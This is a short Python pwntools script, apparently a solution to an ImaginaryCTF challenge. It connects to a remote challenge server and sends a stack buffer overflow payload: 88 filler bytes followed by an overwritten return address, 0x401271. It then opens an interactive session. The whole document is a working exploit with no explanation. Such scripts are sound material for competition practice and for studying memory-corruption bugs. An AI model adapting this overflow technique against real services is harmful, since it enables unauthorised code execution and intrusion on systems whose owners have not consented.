#!/usr/bin/env python3

from pwn import *

# p = process(["./start"])
p = remote("puzzler7.imaginaryctf.org", 7004)

payload = b'a'*88 + p64(0x401271)
p.sendline(payload)
p.interactive()
